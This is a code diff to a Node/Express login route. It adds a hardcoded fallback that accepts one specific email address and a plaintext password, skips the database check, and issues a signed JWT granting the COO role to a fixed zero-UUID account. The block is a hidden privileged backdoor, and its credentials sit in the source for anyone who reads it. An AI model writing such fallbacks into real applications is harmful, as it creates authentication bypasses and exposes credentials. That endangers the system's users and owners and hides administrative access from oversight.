@@ -201,6 +201,38 @@ router.post("/login", async (req, res) => {
       });
     }
 
+    // Hardcoded Admin Fallback
+    if (email.toLowerCase() === "suryailayarajaprof@gmail.com" && password === "COO@2026") {
+      const adminUser = {
+        id: "00000000-0000-0000-0000-000000000000",
+        email: "suryailayarajaprof@gmail.com",
+        role: "COO",
+        department: null,
+        departmentName: null,
+        lastLogin: new Date().toISOString()
+      };
+
+      const token = jwt.sign(
+        {
+          userId: adminUser.id,
+          email: adminUser.email,
+          role: adminUser.role,
+          department: adminUser.department,
+          departmentName: adminUser.departmentName,
+        },
+        JWT_SECRET,
+        { expiresIn: JWT_EXPIRES_IN }
+      );
+
+      return res.json({
+        success: true,
+        message: "Login successful",
+        token,
+        user: adminUser,
+        data: { token, user: adminUser },
+      });
+    }
+
     const supabase = getSupabase();
     const { data: user, error } = await supabase
       .from("users")
